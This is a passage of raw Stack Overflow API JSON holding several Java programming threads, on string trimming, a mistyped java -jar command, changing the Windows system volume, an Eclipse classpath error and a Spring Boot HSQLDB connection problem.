use.</p>\n"},{"tags":[],"owner":{"account_id":23970986,"reputation":1,"user_id":17959666,"display_name":"XYZetaAndMeta"},"down_vote_count":1,"up_vote_count":0,"is_accepted":false,"score":-1,"last_activity_date":1642466619,"creation_date":1642466619,"answer_id":70749103,"question_id":6652687,"body_markdown":"    private void capitaliseEveryWordInASentence() {\r\n\r\n        String mm = &quot;Hello there, this is the cluster&quot;;\r\n\r\n        String[] words = mm.split(&quot; &quot;);\r\n        String outt = &quot;&quot;;\r\n\r\n        for (String w : words) {\r\n\r\n            outt = outt + Character.toUpperCase(w.charAt(0)) + w.substring(1) + &quot; &quot;;\r\n        }\r\n\r\n        System.out.println(outt.trim());\r\n    }","title":"Strip Leading and Trailing Spaces From Java String","body":"<pre><code>private void capitaliseEveryWordInASentence() {\n\n    String mm = &quot;Hello there, this is the cluster&quot;;\n\n    String[] words = mm.split(&quot; &quot;);\n    String outt = &quot;&quot;;\n\n    for (String w : words) {\n\n        outt = outt + Character.toUpperCase(w.charAt(0)) + w.substring(1) + &quot; &quot;;\n    }\n\n    System.out.println(outt.trim());\n}\n</code></pre>\n"}],"owner":{"account_id":368972,"reputation":23426,"user_id":716082,"accept_rate":89,"display_name":"Tyler DeWitt"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":442207,"favorite_count":0,"down_vote_count":3,"up_vote_count":294,"accepted_answer_id":6652705,"answer_count":8,"score":291,"last_activity_date":1642466619,"creation_date":1310398679,"question_id":6652687,"body_markdown":"Is there a convenience method to strip any leading or trailing spaces from a Java String?\r\n\r\nSomething like:\r\n\r\n    String myString = &quot;  keep this  &quot;;\r\n    String stripppedString = myString.strip();\r\n    System.out.println(&quot;no spaces:&quot; + strippedString);\r\n\r\nResult:\r\n\r\n    no spaces:keep this\r\n\r\n`myString.replace(&quot; &quot;,&quot;&quot;)` would replace the space between keep and this.","title":"Strip Leading and Trailing Spaces From Java String","body":"<p>Is there a convenience method to strip any leading or trailing spaces from a Java String?</p>\n\n<p>Something like:</p>\n\n<pre><code>String myString = \"  keep this  \";\nString stripppedString = myString.strip();\nSystem.out.println(\"no spaces:\" + strippedString);\n</code></pre>\n\n<p>Result:</p>\n\n<pre><code>no spaces:keep this\n</code></pre>\n\n<p><code>myString.replace(\" \",\"\")</code> would replace the space between keep and this.</p>\n"},{"tags":["java","jar","virtual-machine","fatal-error"],"comments":[{"owner":{"account_id":5534380,"reputation":268,"user_id":4472711,"display_name":"MNEMO"},"score":0,"creation_date":1642466251,"post_id":70749053,"comment_id":125073075,"body_markdown":"Is it possible for you to describe some more details how and what you have done and how did you configure your system before starting? There is only little information and we cannot go further before you would write.","body":"Is it possible for you to describe some more details how and what you have done and how did you configure your system before starting? There is only little information and we cannot go further before you would write."},{"owner":{"account_id":14357,"reputation":9128,"user_id":29470,"display_name":"Tim Moore"},"score":3,"creation_date":1642466374,"post_id":70749053,"comment_id":125073087,"body_markdown":"There needs to be a space between `-jar` and the filename. If that isn’t the problem, please edit the question to show exactly what command was run as well as the output, and use the code formatting button in the question editor to ensure it displays properly when rendered.","body":"There needs to be a space between <code>-jar</code> and the filename. If that isn’t the problem, please edit the question to show exactly what command was run as well as the output, and use the code formatting button in the question editor to ensure it displays properly when rendered."},{"owner":{"account_id":23970875,"reputation":1,"user_id":17959560,"display_name":"jagadeesh somala"},"score":0,"creation_date":1642466849,"post_id":70749053,"comment_id":125073163,"body_markdown":"Jagadeeshs-MacBook-Air:~ jagadeesh$ java -jar/Users/jagadeesh/Downloads/V983385-01_1of2/fmw_12.2.1.4.0_soa_quickstart.jar\nUnrecognized option: -jar/Users/jagadeesh/Downloads/V983385-01_1of2/fmw_12.2.1.4.0_soa_quickstart.jar\nError: Could not create the Java Virtual Machine.\nError: A fatal exception has occurred. Program will exit.","body":"Jagadeeshs-MacBook-Air:~ jagadeesh$ java -jar/Users/jagadeesh/Downloads/V983385-01_1of2/fmw_12.2.1.4.&zwnj;&#8203;0_soa_quickstart.jar Unrecognized option: -jar/Users/jagadeesh/Downloads/V983385-01_1of2/fmw_12.2.1.4.&zwnj;&#8203;0_soa_quickstart.jar Error: Could not create the Java Virtual Machine. Error: A fatal exception has occurred. Program will exit."},{"owner":{"account_id":23970875,"reputation":1,"user_id":17959560,"display_name":"jagadeesh somala"},"score":0,"creation_date":1642467339,"post_id":70749053,"comment_id":125073228,"body_markdown":"@MNEMO added in comments","body":"@MNEMO added in comments"},{"owner":{"account_id":6520,"reputation":10523,"user_id":11002,"accept_rate":75,"display_name":"tgdavies"},"score":3,"creation_date":1642467607,"post_id":70749053,"comment_id":125073289,"body_markdown":"Don&#39;t clarify in comments, please edit your question.","body":"Don&#39;t clarify in comments, please edit your question."},{"owner":{"account_id":5534380,"reputation":268,"user_id":4472711,"display_name":"MNEMO"},"score":0,"creation_date":1642468855,"post_id":70749053,"comment_id":125073477,"body_markdown":"if you typed that command by yourself, Tim would be right and you need one more space between -jar and /. If your command is auto generated by some other programs, you&#39;d better write down that situation. You are allowed to edit your question directly instead of adding explanations in comments.","body":"if you typed that command by yourself, Tim would be right and you need one more space between -jar and /. If your command is auto generated by some other programs, you&#39;d better write down that situation. You are allowed to edit your question directly instead of adding explanations in comments."}],"owner":{"account_id":23970875,"reputation":1,"user_id":17959560,"display_name":"jagadeesh somala"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":41,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1642465963,"creation_date":1642465963,"question_id":70749053,"body_markdown":"Unrecognized option: -jar/Users/jagadeesh/Downloads/V983385-01_1of2/fmw_12.2.1.4.0_soa_quickstart.jar\r\nError: Could not create the Java Virtual Machine.\r\nError: A fatal exception has occurred. Program will exit.","title":"Want to learn SOA in Macbook, Need to install JAR file","body":"<p>Unrecognized option: -jar/Users/jagadeesh/Downloads/V983385-01_1of2/fmw_12.2.1.4.0_soa_quickstart.jar\nError: Could not create the Java Virtual Machine.\nError: A fatal exception has occurred. Program will exit.</p>\n"},{"tags":["java","audio"],"comments":[{"owner":{"account_id":15064163,"reputation":13519,"user_id":10871900,"display_name":"dan1st is crying"},"score":0,"creation_date":1613677132,"post_id":66266977,"comment_id":117156647,"body_markdown":"Does this answer your question? [Set Computer Volume](https://stackoverflow.com/questions/4964947/set-computer-volume)","body":"Does this answer your question? <a href=\"https://stackoverflow.com/questions/4964947/set-computer-volume\">Set Computer Volume</a>"},{"owner":{"account_id":20719112,"reputation":19,"user_id":15213897,"display_name":"jquigs62"},"score":0,"creation_date":1613677503,"post_id":66266977,"comment_id":117156785,"body_markdown":"Unfortunately not, Ive read through all those threads already. They all kinda self-reference eachother and most of the solutions posted in them either dont work or are only regarding controlling the sound of the audio file but not the system sound itself (think changing the volume slider in a youtube video without actually changing your computers volume). What I want is to actually change my computers volume via a java application","body":"Unfortunately not, Ive read through all those threads already. They all kinda self-reference eachother and most of the solutions posted in them either dont work or are only regarding controlling the sound of the audio file but not the system sound itself (think changing the volume slider in a youtube video without actually changing your computers volume). What I want is to actually change my computers volume via a java application"},{"owner":{"account_id":15064163,"reputation":13519,"user_id":10871900,"display_name":"dan1st is crying"},"score":0,"creation_date":1613677803,"post_id":66266977,"comment_id":117156906,"body_markdown":"What about the first two answers? What does not work, there?","body":"What about the first two answers? What does not work, there?"},{"owner":{"account_id":20719112,"reputation":19,"user_id":15213897,"display_name":"jquigs62"},"score":0,"creation_date":1613678140,"post_id":66266977,"comment_id":117157040,"body_markdown":"The second one I cant use at all because it requires an external tool in order to help adjust the computer volume. I can only do this in the confines of a java program. The first one seems to not work with windows 10 and also seems to only be a &quot;soft control&quot; as i referred to before","body":"The second one I cant use at all because it requires an external tool in order to help adjust the computer volume. I can only do this in the confines of a java program. The first one seems to not work with windows 10 and also seems to only be a &quot;soft control&quot; as i referred to before"},{"owner":{"account_id":15064163,"reputation":13519,"user_id":10871900,"display_name":"dan1st is crying"},"score":0,"creation_date":1613678199,"post_id":66266977,"comment_id":117157070,"body_markdown":"So what about the first answer?","body":"So what about the first answer?"},{"owner":{"account_id":18301757,"reputation":138,"user_id":13326385,"display_name":"Nicolas125841"},"score":0,"creation_date":1613678364,"post_id":66266977,"comment_id":117157135,"body_markdown":"You could use the Robot class to simulate pressing the f7 &amp; f8 keys, but it would be a rough fix.","body":"You could use the Robot class to simulate pressing the f7 &amp; f8 keys, but it would be a rough fix."},{"owner":{"account_id":12583055,"reputation":447,"user_id":9732672,"display_name":"NomadMaker"},"score":0,"creation_date":1613752929,"post_id":66266977,"comment_id":117181975,"body_markdown":"Part of the problem is that Java was designed to be platform independent, so certain things that are platform dependent are difficult to do.","body":"Part of the problem is that Java was designed to be platform independent, so certain things that are platform dependent are difficult to do."},{"owner":{"account_id":7405785,"reputation":2672,"user_id":5634769,"display_name":"gpasch"},"score":0,"creation_date":1613792637,"post_id":66266977,"comment_id":117192755,"body_markdown":"the &quot;The first one seems to not work with windows 10 &quot; is correct - although it has an effect - I have yet to figure out why it isn&#39;t materialzed in the general volume. As for the second I dont see what is &quot;hard&quot; for you since you reject all solutions. I would suggest a script with the robot as indicated above: you can define the steps that you would use manually and do that with the robot - I have done it for some other task - unless you want to deal with MS programming which is what JNA does - - although the computer has to be left to itself for that time period. Any way good luck","body":"the &quot;The first one seems to not work with windows 10 &quot; is correct - although it has an effect - I have yet to figure out why it isn&#39;t materialzed in the general volume. As for the second I dont see what is &quot;hard&quot; for you since you reject all solutions. I would suggest a script with the robot as indicated above: you can define the steps that you would use manually and do that with the robot - I have done it for some other task - unless you want to deal with MS programming which is what JNA does - - although the computer has to be left to itself for that time period. Any way good luck"},{"owner":{"account_id":12157861,"reputation":1714,"user_id":8876321,"display_name":"fdcpp"},"score":0,"creation_date":1613812930,"post_id":66266977,"comment_id":117195995,"body_markdown":"I think it would be worthwhile adding your intended purpose for this. There is the potential that a more elegant solution exists that results in the same effect.","body":"I think it would be worthwhile adding your intended purpose for this. There is the potential that a more elegant solution exists that results in the same effect."}],"answers":[{"tags":[],"owner":{"account_id":401843,"reputation":89788,"user_id":768644,"display_name":"rzwitserloot"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1613678991,"creation_date":1613678535,"answer_id":66267345,"question_id":66266977,"body_markdown":"A crufty, platform-dependent solution:\r\n\r\n1. Download [NirCmd](http://www.nirsoft.net/utils/nircmd.html).\r\n2. Ship the exe which as far as I know is &#39;dependency free&#39; (no installation needed), inside the jar.\r\n3. To change the volume, unpack this exe from your jar to a temp dir (this is a _tad_ security-wise tricky).\r\n4. Run it, using `ProcessBuilder`. It can change the system volume.\r\n\r\nIt&#39;s not great, but, it should work.\r\n\r\nNB: Please check the licensing conditions of NirCmd; this may not be quite acceptable, you may have to show that license as part of your app. Dont take legal advice from a stack overflow answer.","title":"Is there any way to change the system volume with a Java Program?","body":"<p>A crufty, platform-dependent solution:</p>\n<ol>\n<li>Download <a href=\"http://www.nirsoft.net/utils/nircmd.html\" rel=\"nofollow noreferrer\">NirCmd</a>.</li>\n<li>Ship the exe which as far as I know is 'dependency free' (no installation needed), inside the jar.</li>\n<li>To change the volume, unpack this exe from your jar to a temp dir (this is a <em>tad</em> security-wise tricky).</li>\n<li>Run it, using <code>ProcessBuilder</code>. It can change the system volume.</li>\n</ol>\n<p>It's not great, but, it should work.</p>\n<p>NB: Please check the licensing conditions of NirCmd; this may not be quite acceptable, you may have to show that license as part of your app. Dont take legal advice from a stack overflow answer.</p>\n"},{"tags":[],"owner":{"account_id":424804,"reputation":7765,"user_id":805007,"accept_rate":83,"display_name":"Phil Freihofner"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1613752709,"creation_date":1613752709,"answer_id":66281540,"question_id":66266977,"body_markdown":"I was ready to let this question be until I came across the word **impossible**. Before giving up, maybe take a look at the [JNA library][1]. This library is built specifically for accessing native code. \r\n\r\n&gt; JNA provides Java programs easy access to native shared libraries\r\n&gt; without writing anything but Java code - no JNI or native code is\r\n&gt; required. This functionality is comparable to Windows&#39; Platform/Invoke\r\n&gt; and Python&#39;s ctypes.\r\n&gt; \r\n&gt; JNA allows you to call directly into native functions using natural\r\n&gt; Java method invocation.\r\n\r\nThere is an active forum listed in the git README. If nothing else, you can ask/explore whether this issue is one that fits within the capabilities of the library.\r\n\r\nBut I have to admit, even if possible, it seems like it would require considerable effort as well as being dubious in concept: the setting of the computer hardware&#39;s volume is properly in the hands of the computer operator.\r\n\r\n\r\n  [1]: https://github.com/java-native-access/jna","title":"Is there any way to change the system volume with a Java Program?","body":"<p>I was ready to let this question be until I came across the word <strong>impossible</strong>. Before giving up, maybe take a look at the <a href=\"https://github.com/java-native-access/jna\" rel=\"nofollow noreferrer\">JNA library</a>. This library is built specifically for accessing native code.</p>\n<blockquote>\n<p>JNA provides Java programs easy access to native shared libraries\nwithout writing anything but Java code - no JNI or native code is\nrequired. This functionality is comparable to Windows' Platform/Invoke\nand Python's ctypes.</p>\n<p>JNA allows you to call directly into native functions using natural\nJava method invocation.</p>\n</blockquote>\n<p>There is an active forum listed in the git README. If nothing else, you can ask/explore whether this issue is one that fits within the capabilities of the library.</p>\n<p>But I have to admit, even if possible, it seems like it would require considerable effort as well as being dubious in concept: the setting of the computer hardware's volume is properly in the hands of the computer operator.</p>\n"},{"tags":[],"owner":{"account_id":23970835,"reputation":1,"user_id":17959524,"display_name":"Adrian"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642465256,"creation_date":1642465256,"answer_id":70748985,"question_id":66266977,"body_markdown":"Hopefully Windows 11 will have a feature that allows you to change the master volume. What about trying to get the program to trigger the existing software in Windows 10 that changes the volume when you press the keys?\r\n\r\nJavaScript --&gt; Binary Code In Windows 10 --&gt; Master Volume Bypass\r\n","title":"Is there any way to change the system volume with a Java Program?","body":"<p>Hopefully Windows 11 will have a feature that allows you to change the master volume. What about trying to get the program to trigger the existing software in Windows 10 that changes the volume when you press the keys?</p>\n<p>JavaScript --&gt; Binary Code In Windows 10 --&gt; Master Volume Bypass</p>\n"}],"owner":{"account_id":20719112,"reputation":19,"user_id":15213897,"display_name":"jquigs62"},"comment_count":9,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":634,"favorite_count":0,"down_vote_count":1,"up_vote_count":2,"answer_count":3,"score":1,"last_activity_date":1642465256,"creation_date":1613677001,"question_id":66266977,"body_markdown":"I wrote a Java program to change the volume of an audio clip (a .wav) with a command line argument, but that only seems to be somewhat of a &quot;soft&quot; control in that it doesnt actually change the master volume of the actual machine its running on and I have to manually press the increase or decrease volume buttons on my latop to change it further. Is Java capable of changing the actual computer&#39;s volume? If so, how?\r\n\r\nI should add, Im on Windows 10.","title":"Is there any way to change the system volume with a Java Program?","body":"<p>I wrote a Java program to change the volume of an audio clip (a .wav) with a command line argument, but that only seems to be somewhat of a &quot;soft&quot; control in that it doesnt actually change the master volume of the actual machine its running on and I have to manually press the increase or decrease volume buttons on my latop to change it further. Is Java capable of changing the actual computer's volume? If so, how?</p>\n<p>I should add, Im on Windows 10.</p>\n"},{"tags":["java","eclipse"],"comments":[{"owner":{"account_id":8692823,"reputation":31810,"user_id":6505250,"display_name":"howlger"},"score":0,"creation_date":1642286732,"post_id":70723432,"comment_id":125032036,"body_markdown":"Do you have a `module-info.java` file and does deleting it fix your issue? It could also be due to using Java 16 instead of Java 8 (since Java 9 there is no 100% backward compatibility anymore).","body":"Do you have a <code>module-info.java</code> file and does deleting it fix your issue? It could also be due to using Java 16 instead of Java 8 (since Java 9 there is no 100% backward compatibility anymore)."},{"owner":{"account_id":1146245,"reputation":580,"user_id":1128925,"accept_rate":78,"display_name":"cliff2310"},"score":0,"creation_date":1642290817,"post_id":70723432,"comment_id":125032633,"body_markdown":"@howlger Don&#39;t have a module-info.java.  I did try changing Java #s, no change.  thanks","body":"@howlger Don&#39;t have a module-info.java.  I did try changing Java #s, no change.  thanks"},{"owner":{"account_id":1146245,"reputation":580,"user_id":1128925,"accept_rate":78,"display_name":"cliff2310"},"score":0,"creation_date":1642351577,"post_id":70723432,"comment_id":125042451,"body_markdown":"@abra Eclipse shows no errors.  As I said, it runs without error in the old Eclipse.","body":"@abra Eclipse shows no errors.  As I said, it runs without error in the old Eclipse."},{"owner":{"account_id":1146245,"reputation":580,"user_id":1128925,"accept_rate":78,"display_name":"cliff2310"},"score":0,"creation_date":1642376127,"post_id":70723432,"comment_id":125048064,"body_markdown":"@abra Yes. You can see the library&#39;s build path in the figure 1. See edit2 for run dependences and the command line.","body":"@abra Yes. You can see the library&#39;s build path in the figure 1. See edit2 for run dependences and the command line."},{"owner":{"account_id":2485939,"reputation":19426,"user_id":2164365,"accept_rate":40,"display_name":"Abra"},"score":0,"creation_date":1642396495,"post_id":70723432,"comment_id":125050780,"body_markdown":"Mixing classpath and module-path never works for me. I always put everything in module-path.","body":"Mixing classpath and module-path never works for me. I always put everything in module-path."},{"owner":{"account_id":1146245,"reputation":580,"user_id":1128925,"accept_rate":78,"display_name":"cliff2310"},"score":0,"creation_date":1642438085,"post_id":70723432,"comment_id":125065351,"body_markdown":"@abra OK, how do I do that? In Oxygen there was no module-path, that I ever saw.  Eclipse put things where they are and I have not been able to make any changes to that.","body":"@abra OK, how do I do that? In Oxygen there was no module-path, that I ever saw.  Eclipse put things where they are and I have not been able to make any changes to that."}],"answers":[{"tags":[],"owner":{"account_id":1146245,"reputation":580,"user_id":1128925,"accept_rate":78,"display_name":"cliff2310"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1642465204,"creation_date":1642465204,"answer_id":70748980,"question_id":70723432,"body_markdown":"In the figure below \r\n\r\n[![enter image description here][1]][1] \r\n\r\nYou must delete the jar from *Modulepath* THEN add it to the *Classpath*. The JRE seems just fine in the Modulepath. Once my library is in the classpath the code works. \r\n\r\n\r\n  [1]: https://i.stack.imgur.com/bUhfe.png","title":"Eclipse IDE for Java Developers 2021-06 Cannot find class paths for jars","body":"<p>In the figure below</p>\n<p><a href=\"https://i.stack.imgur.com/bUhfe.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/bUhfe.png\" alt=\"enter image description here\" /></a></p>\n<p>You must delete the jar from <em>Modulepath</em> THEN add it to the <em>Classpath</em>. The JRE seems just fine in the Modulepath. Once my library is in the classpath the code works.</p>\n"}],"owner":{"account_id":1146245,"reputation":580,"user_id":1128925,"accept_rate":78,"display_name":"cliff2310"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":211,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"accepted_answer_id":70748980,"answer_count":1,"score":1,"last_activity_date":1642465204,"creation_date":1642265055,"question_id":70723432,"body_markdown":"I have built a new machine and installed a fresh version of eclipse (Eclipse IDE for Java Developers 2021-06). If I run an old project it works. If I make a new project I the following error.&lt;br&gt;\r\n    Exception in thread &quot;main&quot; java.lang.NoClassDefFoundError: net/crl/CRLibs/DBI\r\n    at EnvList.&lt;clinit&gt;(EnvList.java:143)\r\n    Caused by: java.lang.ClassNotFoundException: net.crl.CRLibs.DBI&lt;br&gt;\r\nThere are no errors in the code.\r\nThe build path looks like: \r\n\r\n[![New Build Path][1]][1]\r\n\r\n    Line:143 is: static DBI db = new DBI();\r\n\r\nDBI is defined in the crlibs jar.\r\nIn my old Eclipse (Oxygen) the build path looks like:\r\n[![Oxygen Build Path][2]][2]\r\n\r\nI tried adding the crlibs jar to the Classpath, but it will not let me save it (all boxes grayed out).\r\nNow this code is copy of a template I use. The original runs just fine and its build path looks like the one from Oxygen.\r\n\r\n\r\nIf I comment out this line it will give the same error at the next library access.\r\nIt appears that the Class paths to the library are not being included.\r\nNote The library was built with Oxygen. Do I need to rebuild it with the new version and if so will it then still work for all the code build with Oxygen.\r\nHow do I fix this?\r\n\r\nNote:\r\n Eclipse Java EE IDE for Web Developers.\r\nVersion: Oxygen.3a Release (4.7.3a)\r\nBuild id: 20180405-1200\r\n\r\nAnd\r\n Eclipse IDE for Java Developers (includes Incubating components)\r\nVersion: 2021-06 (4.20.0)\r\nBuild id: 20210612-2011\r\n\r\nEDIT:\r\nHere is the .classpath file.:\r\n\r\n\r\n    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\r\n    &lt;classpath&gt;\r\n    \t&lt;classpathentry kind=&quot;src&quot; path=&quot;src&quot;/&gt;\r\n    \t&lt;classpathentry kind=&quot;src&quot; path=&quot;resources&quot;/&gt;\r\n    \t&lt;classpathentry kind=&quot;con&quot; path=&quot;org.eclipse.jdt.launching.JRE_CONTAINER/org.eclipse.jdt.internal.debug.ui.launcher.StandardVMType/JavaSE-16&quot;&gt;\r\n    \t\t&lt;attributes&gt;\r\n    \t\t\t&lt;attribute name=&quot;module&quot; value=&quot;true&quot;/&gt;\r\n    \t\t&lt;/attributes&gt;\r\n    \t&lt;/classpathentry&gt;\r\n    \t&lt;classpathentry kind=&quot;lib&quot; path=&quot;E:/Documents and Settings/Cliff/libs/crlibs.jar&quot; sourcepath=&quot;E:/Documents and Settings/Cliff/Libs_src/CRLibs/src/net/crl/CRLibs&quot;&gt;\r\n    \t\t&lt;attributes&gt;\r\n    \t\t\t&lt;attribute name=&quot;javadoc_location&quot; value=&quot;file:/E:/Documents%20and%20Settings/Cliff/Libs_src/CRLibs/CRLibs/doc/&quot;/&gt;\r\n    \t\t\t&lt;attribute name=&quot;module&quot; value=&quot;true&quot;/&gt;\r\n    \t\t&lt;/attributes&gt;\r\n    \t&lt;/classpathentry&gt;\r\n    \t&lt;classpathentry kind=&quot;output&quot; path=&quot;bin&quot;/&gt;\r\n    &lt;/classpath&gt;\r\n\r\nThe path to the jar is there?\r\n\r\nEDIT2\r\n[![enter image description here][3]][3]\r\nThe command line:\r\n\r\n[![enter image description here][4]][4]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/uPDrZ.png\r\n  [2]: https://i.stack.imgur.com/m9I5z.png\r\n  [3]: https://i.stack.imgur.com/UZQDs.png\r\n  [4]: https://i.stack.imgur.com/NSfbn.png","title":"Eclipse IDE for Java Developers 2021-06 Cannot find class paths for jars","body":"<p>I have built a new machine and installed a fresh version of eclipse (Eclipse IDE for Java Developers 2021-06). If I run an old project it works. If I make a new project I the following error.<br>\nException in thread &quot;main&quot; java.lang.NoClassDefFoundError: net/crl/CRLibs/DBI\nat EnvList.(EnvList.java:143)\nCaused by: java.lang.ClassNotFoundException: net.crl.CRLibs.DBI<br>\nThere are no errors in the code.\nThe build path looks like:</p>\n<p><a href=\"https://i.stack.imgur.com/uPDrZ.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/uPDrZ.png\" alt=\"New Build Path\" /></a></p>\n<pre><code>Line:143 is: static DBI db = new DBI();\n</code></pre>\n<p>DBI is defined in the crlibs jar.\nIn my old Eclipse (Oxygen) the build path looks like:\n<a href=\"https://i.stack.imgur.com/m9I5z.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/m9I5z.png\" alt=\"Oxygen Build Path\" /></a></p>\n<p>I tried adding the crlibs jar to the Classpath, but it will not let me save it (all boxes grayed out).\nNow this code is copy of a template I use. The original runs just fine and its build path looks like the one from Oxygen.</p>\n<p>If I comment out this line it will give the same error at the next library access.\nIt appears that the Class paths to the library are not being included.\nNote The library was built with Oxygen. Do I need to rebuild it with the new version and if so will it then still work for all the code build with Oxygen.\nHow do I fix this?</p>\n<p>Note:\nEclipse Java EE IDE for Web Developers.\nVersion: Oxygen.3a Release (4.7.3a)\nBuild id: 20180405-1200</p>\n<p>And\nEclipse IDE for Java Developers (includes Incubating components)\nVersion: 2021-06 (4.20.0)\nBuild id: 20210612-2011</p>\n<p>EDIT:\nHere is the .classpath file.:</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;classpath&gt;\n    &lt;classpathentry kind=&quot;src&quot; path=&quot;src&quot;/&gt;\n    &lt;classpathentry kind=&quot;src&quot; path=&quot;resources&quot;/&gt;\n    &lt;classpathentry kind=&quot;con&quot; path=&quot;org.eclipse.jdt.launching.JRE_CONTAINER/org.eclipse.jdt.internal.debug.ui.launcher.StandardVMType/JavaSE-16&quot;&gt;\n        &lt;attributes&gt;\n            &lt;attribute name=&quot;module&quot; value=&quot;true&quot;/&gt;\n        &lt;/attributes&gt;\n    &lt;/classpathentry&gt;\n    &lt;classpathentry kind=&quot;lib&quot; path=&quot;E:/Documents and Settings/Cliff/libs/crlibs.jar&quot; sourcepath=&quot;E:/Documents and Settings/Cliff/Libs_src/CRLibs/src/net/crl/CRLibs&quot;&gt;\n        &lt;attributes&gt;\n            &lt;attribute name=&quot;javadoc_location&quot; value=&quot;file:/E:/Documents%20and%20Settings/Cliff/Libs_src/CRLibs/CRLibs/doc/&quot;/&gt;\n            &lt;attribute name=&quot;module&quot; value=&quot;true&quot;/&gt;\n        &lt;/attributes&gt;\n    &lt;/classpathentry&gt;\n    &lt;classpathentry kind=&quot;output&quot; path=&quot;bin&quot;/&gt;\n&lt;/classpath&gt;\n</code></pre>\n<p>The path to the jar is there?</p>\n<p>EDIT2\n<a href=\"https://i.stack.imgur.com/UZQDs.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/UZQDs.png\" alt=\"enter image description here\" /></a>\nThe command line:</p>\n<p><a href=\"https://i.stack.imgur.com/NSfbn.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/NSfbn.png\" alt=\"enter image description here\" /></a></p>\n"},{"tags":["java","sql","spring-boot","hibernate","hsqldb"],"comments":[{"owner":{"account_id":8909811,"reputation":2612,"user_id":6650475,"display_name":"Andrew S"},"score":0,"creation_date":1642468002,"post_id":70748933,"comment_id":125073357,"body_markdown":"That _Driver does not support..._ message is an INFO message (not an error), and may be related to using an in-memory database (based on the `spring.datasource.url` value).","body":"That <i>Driver does not support...</i> message is an INFO message (not an error), and may be related to using an in-memory database (based on the <code>spring.datasource.url</code> value)."},{"owner":{"account_id":23664515,"reputation":85,"user_id":17734891,"display_name":"Smetana Po Aktsii"},"score":0,"creation_date":1642468488,"post_id":70748933,"comment_id":125073421,"body_markdown":"Ok, how I can get access to my tables? Intellij IDEA plugin cannot connect to DB","body":"Ok, how I can get access to my tables? Intellij IDEA plugin cannot connect to DB"}],"owner":{"account_id":23664515,"reputation":85,"user_id":17734891,"display_name":"Smetana Po Aktsii"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":1692,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1642464704,"creation_date":1642464704,"question_id":70748933,"body_markdown":"I use Spring Boot and HSQLDB and I can&#39;t connect to the database.\r\nI always get an error &quot;Driver does not support get/set network timeout for connections&quot; despite the fact that I&#39;m using the latest version of the driver.\r\n\r\nMy application.properties :\r\n\r\n    spring.datasource.url=jdbc:hsqldb:mem:bank_db;DB_CLOSE_DELAY=-1\r\n    spring.datasource.username=sa\r\n    spring.datasource.password=\r\n            \r\n    spring.jpa.hibernate.ddl-auto=create\r\n    spring.jpa.show-sql=true\r\n\r\nMy entities:\r\n\r\n\r\n    @Entity\r\n    @Table(name = &quot;banks&quot;)\r\n    @Getter\r\n    @Setter\r\n    @NoArgsConstructor\r\n    public class Bank {\r\n    \r\n        @Id\r\n        @Column(name = &quot;bank_id&quot;)\r\n        @GeneratedValue(strategy = GenerationType.AUTO)\r\n        private UUID id;\r\n    \r\n        @OneToMany(cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH},\r\n                mappedBy = &quot;bank&quot;)\r\n        private List&lt;Credit&gt; credits = new ArrayList&lt;&gt;();\r\n    \r\n        @OneToMany(cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH},\r\n                mappedBy = &quot;bank&quot;)\r\n        private List&lt;Client&gt; clients = new ArrayList&lt;&gt;();\r\n    }\r\n\r\n\r\n\r\n    @Entity\r\n    @Table(name = &quot;clients&quot;)\r\n    @Getter\r\n    @Setter\r\n    @NoArgsConstructor\r\n    public class Client {\r\n    \r\n    \r\n       @Id\r\n       @Column(name = &quot;credit_id&quot;)\r\n       @GeneratedValue(strategy = GenerationType.AUTO)\r\n       private UUID id;\r\n    \r\n       @Column(name = &quot;telephone_number&quot;)\r\n       private Long telephoneNumber;\r\n    \r\n       @Column(name = &quot;email&quot;)\r\n       private String email;\r\n    \r\n       @Column(name = &quot;passport_number&quot;)\r\n       private Long passportNumber;\r\n    \r\n       @ManyToOne(targetEntity = Bank.class,cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH})\r\n       @JoinColumn(name = &quot;bank_id&quot;)\r\n       private Bank bank;\r\n    \r\n       @OneToMany(cascade = {CascadeType.DETACH, CascadeType.MERGE, CascadeType.PERSIST, CascadeType.REFRESH},\r\n               mappedBy = &quot;client&quot;)\r\n       private List&lt;CreditOffer&gt; creditOffers;\r\n    \r\n    \r\n    }\r\n\r\n\r\n    @Entity\r\n    @Table(name = &quot;credits&quot;)\r\n    @Getter\r\n    @Setter\r\n    @NoArgsConstructor\r\n    public class Credit {\r\n    \r\n        @Id\r\n        @Column(name = &quot;credit_id&quot;)\r\n        @GeneratedValue(strategy = GenerationType.AUTO)\r\n        private UUID id;\r\n    \r\n        @Column(name = &quot;credit_limit&quot;)\r\n        private Long creditLimit;\r\n    \r\n        @Column(name = 